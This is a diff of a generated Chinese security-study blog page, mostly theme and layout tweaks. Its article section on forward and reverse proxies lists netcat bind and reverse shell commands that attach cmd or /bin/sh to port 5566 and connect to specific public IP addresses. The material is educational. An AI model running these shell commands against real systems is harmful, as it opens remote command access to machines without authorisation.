@@ -40,7 +40,10 @@
       s.parentNode.insertBefore(hm, s);
     })();
     </script>
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="DU-玉" type="application/atom+xml">
+</head>
 
 
 
@@ -486,7 +489,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928014727.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/null')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -649,7 +652,17 @@
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    800
+                </div>
+                
 
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    2 分
+                </div>
                 
 
                 
@@ -681,23 +694,23 @@
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606173654309.png" alt="image-20230606173654309"></p>
 <h2 id="三、正反向代理"><a href="#三、正反向代理" class="headerlink" title="三、正反向代理"></a>三、正反向代理</h2><h4 id="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"><a href="#原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接" class="headerlink" title="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"></a>原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接</h4><p>1、正向连接：本地监听等待对方连接</p>
 <p>Linux控制Windows</p>
-<p>&#x2F;&#x2F;绑定CMD到本地5566端口</p>
+<p>//绑定CMD到本地5566端口</p>
 <p>nc -e cmd -lvp 5566</p>
-<p>&#x2F;&#x2F;主动连接目标5566</p>
+<p>//主动连接目标5566</p>
 <p>ncat 47.122.23.131 5566</p>
 <p>Windows控制Linux</p>
-<p>&#x2F;&#x2F;绑定SH到本地5566端口</p>
-<p>ncat -e &#x2F;bin&#x2F;sh -lvp 5566</p>
-<p>&#x2F;&#x2F;主动连接目标5566</p>
+<p>//绑定SH到本地5566端口</p>
+<p>ncat -e /bin/sh -lvp 5566</p>
+<p>//主动连接目标5566</p>
 <p>nc 47.94.236.117 5566</p>
 <p>2、反向连接：主动给出去，对方监听</p>
-<p>&#x2F;&#x2F;绑定CMD到目标5566端口</p>
-<p>ncat -e &#x2F;bin&#x2F;sh 47.122.23.131 5566</p>
-<p>&#x2F;&#x2F;等待5566连接</p>
+<p>//绑定CMD到目标5566端口</p>
+<p>ncat -e /bin/sh 47.122.23.131 5566</p>
+<p>//等待5566连接</p>
 <p>nc -lvvp 5566</p>
-<p>&#x2F;&#x2F;绑定CMD到目标5566端口</p>
+<p>//绑定CMD到目标5566端口</p>
 <p>nc -e cmd 47.94.236.117 5566</p>
-<p>&#x2F;&#x2F;等待5566连接</p>
+<p>//等待5566连接</p>
 <p>ncat -lvvp 5566</p>
 <h2 id="四、内网服务器"><a href="#四、内网服务器" class="headerlink" title="四、内网服务器"></a>四、内网服务器</h2><p>只有内网IP主动出去找主机IP（唯一）才行</p>
 <p>在内网的路由器上设置一个<strong>端口转发</strong>（端口隐私），可以和内网的目标IP交互 </p>
@@ -741,7 +754,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://POISON-Biao.github.io/DU-YU/information.collection.05.html">https://POISON-Biao.github.io/DU-YU/information.collection.05.html</a>
+                    <a href="https://POISON-Biao.github.io/du-yu/information.collection.05.html">https://POISON-Biao.github.io/du-yu/information.collection.05.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1256,11 +1269,11 @@ new Valine({
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/DU-YU/information.collection.06.html">
+                <a href="/du-yu/information.collection.06.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020832.jpg" class="responsive-img" alt="06抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动">
+                        <img src="/null" class="responsive-img" alt="06抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动">
                         
                         <span class="card-title">06抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动</span>
                     </div>
@@ -1305,11 +1318,11 @@ new Valine({
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/DU-YU/information.collection.04.html">
+                <a href="/du-yu/information.collection.04.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020152.jpg" class="responsive-img" alt="04APP架构-封装&amp;原生态&amp;H5&amp;flutter">
+                        <img src="/null" class="responsive-img" alt="04APP架构-封装&amp;原生态&amp;H5&amp;flutter">
                         
                         <span class="card-title">04APP架构-封装&amp;原生态&amp;H5&amp;flutter</span>
                     </div>
@@ -1579,6 +1592,9 @@ new Valine({
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
             
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">3k</span>&nbsp;字
+            
             
             
             
@@ -1608,7 +1624,7 @@ new Valine({
                     var today = new Date();
                     var startYear = "2023";
                     var startMonth = "7";
-                    var startDate = "2";
+                    var startDate = "4";
                     var startHour = "0";
                     var startMinute = "0";
                     var startSecond = "0";
@@ -1838,21 +1854,31 @@ $(function () {
 
     
 
+<!-- 深色模式自动调节 -->
 <!-- 深色模式按钮 -->
-    <script>
-        if (localStorage.getItem('dark') === '1') {
+<script>
+    // 检查localStorage中是否有'dark'这个键，且其值是否为'1'
+    if (localStorage.getItem('dark') === '1') {
+        // 如果有且其值为'1'，则给body添加'dark'这个类，切换到深色模式
         document.body.classList.add('dark');
-        }
-        else if (new Date().getHours() >= 22 || new Date().getHours() < 7) {
+    }
+    // 检查当前时间是否在晚上22点到早上7点之间
+    // else if (new Date().getHours() >= 22 || new Date().getHours() < 7) {
+    //     // 如果是，则给body添加'dark'这个类，切换到深色模式
+    //     document.body.classList.add('dark');
+    // } 
+    // 检查用户的系统是否偏好深色模式
+    else if (matchMedia('(prefers-color-scheme: dark)').matches) {
+        // 如果是，则给body添加'dark'这个类，切换到深色模式
         document.body.classList.add('dark');
-        } 
-        else if (matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-        }
-    </script>
-    <a onclick="switchNightMode()" id="sma">
-        <i class="fas fa-lightbulb" id="nightMode" aria-hidden="true"></i>
-    </a>
+    }
+</script>
+<!-- 深色模式切换按钮，点击时调用switchNightMode()函数 -->
+<a onclick="switchNightMode()" id="sma">
+    <!-- 深色模式切换按钮的图标 -->
+    <i class="fas fa-lightbulb" id="nightMode" aria-hidden="true"></i>
+</a>
+
 
     <!-- 天气接口控件   -->
     
